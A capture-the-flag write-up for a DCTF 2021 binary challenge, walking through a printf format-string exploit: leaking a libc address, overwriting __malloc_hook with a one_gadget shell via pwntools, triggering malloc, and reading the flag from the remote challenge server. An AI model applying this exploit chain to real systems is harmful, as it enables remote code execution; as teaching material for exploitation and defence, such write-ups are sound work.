
Function *vuln* allowed to input 100 characters into array that can store 104 bytes, then printed it with *printf*, considered using printf format exploit. A Dockerfile was also given, which indicated the server was using *ubuntu 18.04*, found libc version, *libc6_2.27-3ubuntu1.4*, was used accordingly, can be downloaded [here](https://ubuntu.pkgs.org/18.04/ubuntu-updates-main-amd64/libc6_2.27-3ubuntu1.4_amd64.deb.html).

```c
void vuln(void)
{
  long in_FS_OFFSET;
  char local_78 [104];
  undefined8 local_10;
  
  local_10 = *(undefined8 *)(in_FS_OFFSET + 0x28);
  do {
    puts("I won\'t ask you, what your name is. It\'s getting kinda old at this point");
    __isoc99_scanf("%100s",local_78);
    puts("you entered");
    printf(local_78);
    puts("");
    puts("");
  } while( true );
}
```

### Finding Offset

Ran the program in *gdb*, break at the line to call *printf*.

Input ``"%n$p"`` to print the content at nth place in stack, tried out several times from 1, found the offset to be 6.


```bash
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffda10│+0x0000: 0x0000000070243625 ("%6$p"?)         ← $rsp
0x00007fffffffda18│+0x0008: 0x0000000000000000
0x00007fffffffda20│+0x0010: 0x0000000000000000
0x00007fffffffda28│+0x0018: 0x0000000000000000                                                                                                                          
0x00007fffffffda30│+0x0020: 0x0000555555400040  →   (bad) 
0x00007fffffffda38│+0x0028: 0x0000000000000009    
0x00007fffffffda40│+0x0030: 0x0000000000f0b2ff                       
0x00007fffffffda48│+0x0038: 0x00000000000000c2                                    
0x00007fffffffda50│+0x0040: 0x0000000000000001                     
```

```bash
gef➤  c                                                                                                                                                                 
Continuing.

0x70243625                         
```

### Finding Libc Base

For a better view of stack in *gdb*, configured *gef* to show more lines in stack section.

```bash
gef➤  gef config context.nb_lines_stack 32
```

To find libc base used *__libc_start_main* as the function to leak. Found a relative address that was pushed into stack, like ``<__libc_start_main+x>``, calculate *__libc_start_main* address by formular ``<address in stack> - x``, then libc base would be ``<__libc_start_main address> - <__libc_start_main offset in libc>``. Tried out different n in format ``%n$p``, until the value printed by program matchs address of ``<__libc_start_main+x>``. In this case it was 23.

```bash
...
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffd980│+0x0000: 0x0000007024333225 ("%23$p"?)        ← $rsp
0x00007fffffffd988│+0x0008: 0x0000000000000000
0x00007fffffffd990│+0x0010: 0x0000000000000000
0x00007fffffffd998│+0x0018: 0x0000000000000000                                                                                                        
0x00007fffffffd9a0│+0x0020: 0x0000555555400040  →   (bad) 
0x00007fffffffd9a8│+0x0028: 0x0000000000000009    
0x00007fffffffd9b0│+0x0030: 0x0000000000f0b2ff                       
0x00007fffffffd9b8│+0x0038: 0x00000000000000c2                                                                                                        
0x00007fffffffd9c0│+0x0040: 0x0000000000000001                     
0x00007fffffffd9c8│+0x0048: 0x000055555540081d  →  <__libc_csu_init+77> add rbx, 0x1
0x00007fffffffd9d0│+0x0050: 0x0000000000000000                     
0x00007fffffffd9d8│+0x0058: 0x0000000000000000                    
0x00007fffffffd9e0│+0x0060: 0x00005555554007d0  →  <__libc_csu_init+0> push r15
0x00007fffffffd9e8│+0x0068: 0x065e6fd2fd8fae00                                                                                                        
0x00007fffffffd9f0│+0x0070: 0x00007fffffffda00  →  0x00005555554007d0  →  <__libc_csu_init+0> push r15   ← $rbp
0x00007fffffffd9f8│+0x0078: 0x00005555554007c4  →  <main+24> mov eax, 0x0                                                                             
0x00007fffffffda00│+0x0080: 0x00005555554007d0  →  <__libc_csu_init+0> push r15
0x00007fffffffda08│+0x0088: 0x00007ffff7dfb082  →  <__libc_start_main+231> mov edi, eax
...
gef➤  c
Continuing.
0x7ffff7dfb082

I won't ask you, what your name is. It's getting kinda old at this point
```

### Using One Gadget

We needed to overwrite *__malloc_hook* with *system("/bin/sh")* gadget, once *printf* was triggered to use heap, *malloc* was called, so as *__malloc_hook*. One gadget is handy for this task. Those addresses are offsets in libc, also needed to change according to libc base found above, used one that works.

```bash
$ one_gadget libc-2.27.so 
0x4f3d5 execve("/bin/sh", rsp+0x40, environ)
constraints:
rsp & 0xf == 0
rcx == NULL

0x4f432 execve("/bin/sh", rsp+0x40, environ)
constraints:
[rsp+0x40] == NULL

0x10a41c execve("/bin/sh", rsp+0x70, environ)
constraints:
[rsp+0x70] == NULL
```

### Cat flag.txt

Created the first payload to print the 23rd position in stack.

```python
gadgets = [0x4f3d5, 0x4f432, 0x10a41c]

payload = "%{}$p".format(23)
pr.sendlineafter("point\n", payload)
pr.readline()

libc_start_main_addr = int(pr.readline().strip().decode(), 16) - 231
libc.sym['gadget'] = gadgets[2]
libc.address = libc_start_main_addr - libc.sym['__libc_start_main']
```

Created the second payload to overwrite *__malloc_hook*. Needed to update ``pwn.context`` ahead, ``pwn.context.clear(bits=64)``, in case it ran into wrong limit of address.

```python
stack_offset = 6
payload = pwn.fmtstr_payload(stack_offset, {libc.sym["__malloc_hook"]:libc.sym['gadget']}, write_size='short')
pr.sendafter("point\n", payload)
pr.sendline()
```

Created the third payload to trigger *printf* to call *malloc*.

```python
payload = b"%65537$c"
pr.sendafter("point\n", payload)
pr.sendline()
```

Finally, favorite part.

```python
pr.readline()
pr.sendline('cat flag.txt')
print(pr.readall(2))
```

```bash
[+] Opening connection to dctf-chall-formats-last-theorem.westeurope.azurecontainer.io on port 7482: Done
libc @ 0x7f1d213a3000
gadget @ 0x7f1d214ad41c
__libc_start_main @ 0x7f1d213c4b10
__malloc_hook @ 0x7f1d2178ec30
b'%54300c%11$lln%19758c%12$hn%24019c%13$hn0\xecx!\x1d\x7f\x00\x002\xecx!\x1d\x7f\x00\x004\xecx!\x1d\x7f\x00\x00' 64
[+] Receiving all data: Done (34B)
[*] Closed connection to dctf-chall-formats-last-theorem.westeurope.azurecontainer.io port 7482
b'dctf{N0t_all_7h30r3ms_s0und_g00d}\n'
```

Full exploit is [here](https://github.com/onealmond/hacking-lab/blob/master/dctf-2021/formats-last-theorem/exploit.py).

### Reference

- [Use Printf To Trigger Malloc And Free](https://github.com/Naetw/CTF-pwn-tips#use-printf-to-trigger-malloc-and-free)
- [One Gadgets And Malloc Hook](https://ir0nstone.gitbook.io/notes/types/stack/one-gadgets-and-malloc-hook)
